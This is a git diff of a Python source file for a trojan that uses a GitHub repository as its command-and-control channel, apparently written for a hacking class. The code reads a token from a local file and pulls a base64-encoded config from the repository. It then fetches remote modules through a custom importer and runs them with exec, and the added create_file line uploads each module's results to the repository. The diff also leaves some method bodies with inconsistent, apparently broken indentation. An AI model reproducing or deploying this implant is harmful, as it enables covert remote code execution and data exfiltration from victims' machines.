@@ -1,29 +1,26 @@
-#what up, its time for tommy buns to get some imports goin yo, Unhappy about GH3
+#creating my imports
 import base64
 import github3
-import importlib
+import importlib.util
 import json
 import random
 import sys
 import threading
 import time
-#Lets lay out some funky time
 from datetime import datetime
-# Putting my suped duper github code in place:
+
+# Function to connect to GitHub
 def github_connect():
-        #My token file path
         with open('/home/tomtom/env/gitpass.txt') as f:
-            #Dont forget to strip
             token = f.read().strip()
         user = 'drlooshackingclass'
         sess = github3.login(token=token)
         return sess.repository(user, 'bhptrojan')
 
-#Get files from my repo
+# Function to get file contents from GitHub
 def get_file_contents(dirname, module_name, repo):
         return repo.file_contents(f'{dirname}/{module_name}').content
 
-#Creating my trojan class
 class Trojan:
     def __init__(self, id):
         self.id = id
@@ -32,25 +29,24 @@ class Trojan:
         self.repo = github_connect()
 
     def get_config(self):
-        config_json = get_file_contents('config', self.config_file, self.repo)
-        if config_json:
-                config = json.loads(base64.b64decode(config_json))
-                for task in config:
-                    if task['module'] not in sys.modules:
-                        print(f"[*] Attempting to retrieve {task['module']}")
-                        exec(f"import {task['module']}")
-                return config
-        return []
+            config_json = get_file_contents('config', self.config_file, self.repo)
+            config = json.loads(base64.b64decode(config_json))
+
+            for task in config:
+                if task['module'] not in sys.modules:
+                        exec("import %s" % task['module'])
+            return config
+        
 
     def module_runner(self, module):
-        result = sys.modules[module].run()
-        self.store_module_result(result)
+            result = sys.modules[module].run()
+            self.store_module_result(result)
 
     def store_module_result(self, data):
-        message = datetime.now().isoformat()
-        remote_path = f'data/{self.id}/{message}.data'
-        bindata = bytes('%r' % data, 'utf-8')
-        encoded_data = base64.b64encode(bindata)
+            message = datetime.now().isoformat()
+            remote_path = f'data/{self.id}/{message}.data'
+            bindata = bytes('%r' % data, 'utf-8')
+            self.repo.create_file(remote_path, message, base64.b64encode(bindata))
 
     def run(self):
         while True:
@@ -60,7 +56,7 @@ class Trojan:
                 thread.start()
             time.sleep(random.randint(1, 10))
 
-        time.sleep(random.randint(30*60, 3*60*60))
+            time.sleep(random.randint(30*60, 3*60*60))
 
 class GitImporter:
     def __init__(self):
@@ -71,9 +67,9 @@ class GitImporter:
         self.repo = github_connect()
         new_library = get_file_contents('modules', f'{name}.py', self.repo)
         if new_library is not None:
-            self.current_module_code = base64.b64decode(new_library).decode('utf-8')
+            self.current_module_code = base64.b64decode(new_library)
             return self
-        
+
     def load_module(self, name):
         spec = importlib.util.spec_from_loader(name, loader=None, origin=self.repo.git_url)
         new_module = importlib.util.module_from_spec(spec)
